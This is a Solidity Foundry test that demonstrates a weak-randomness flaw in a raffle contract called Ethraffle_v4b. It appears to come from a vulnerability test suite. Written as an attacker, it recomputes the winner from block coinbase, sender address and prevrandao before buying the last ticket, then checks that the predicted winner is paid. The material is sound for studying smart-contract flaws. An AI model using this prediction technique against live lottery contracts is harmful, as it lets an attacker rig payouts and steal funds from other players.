pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Ethraffle_v4b} from "../src/Ethraffle_v4b.sol";

contract TestWeakRandomnessEthraffle_v4b is Test {

    Ethraffle_v4b public _contractUnderTest;
    
    uint256 public constant TOTAL_TICKETS = 50;
    uint256 public constant PRICE_PER_TICKET = (2.5 ether + 0.03 ether) / 50;
    uint256 public constant PRIZE = 2.5 ether;
    
    address[] public contestantAddresses;

    function setUp() public {
        _contractUnderTest = new Ethraffle_v4b();
    }

    function test_highlightPredictableRandomValue(
        uint256 blockPrevrandao,
        address blockCoinbase
    ) public {
        vm.assume(blockCoinbase != address(0));
        vm.assume(blockPrevrandao > 0);
        
        vm.prevrandao(bytes32(blockPrevrandao));
        vm.coinbase(blockCoinbase);

        for (uint256 i = 0; i < 49; i++) {
            address buyer = address(uint160(i + 100));
            contestantAddresses.push(buyer);
            vm.deal(buyer, PRICE_PER_TICKET);
            vm.prank(buyer);
            _contractUnderTest.buyTickets{value: PRICE_PER_TICKET}();
        }
        
        address attacker = address(this);
        contestantAddresses.push(attacker);
        vm.deal(attacker, PRICE_PER_TICKET + 1 ether);
        
        uint256 coinbaseIndex = uint256(uint160(blockCoinbase)) % TOTAL_TICKETS;
        address expectedSeed1 = contestantAddresses[coinbaseIndex];
        
        uint256 senderIndex = uint256(uint160(attacker)) % TOTAL_TICKETS;
        address expectedSeed2 = contestantAddresses[senderIndex];
        
        uint256 expectedSeed3 = blockPrevrandao;
        
        bytes32 expectedRandHash = keccak256(abi.encodePacked(expectedSeed1, expectedSeed2, expectedSeed3));
        
        uint256 expectedWinningNumber = uint256(expectedRandHash) % TOTAL_TICKETS;
        address expectedWinner = contestantAddresses[expectedWinningNumber];
        
        uint256 winnerBalanceBefore = expectedWinner.balance;
        
        _contractUnderTest.buyTickets{value: PRICE_PER_TICKET}();
        
        assertEq(
            expectedWinner.balance,
            winnerBalanceBefore + PRIZE,
            "Predicted winner should receive the prize - proves randomness is predictable"
        );
    }
    
    receive() external payable {}
}
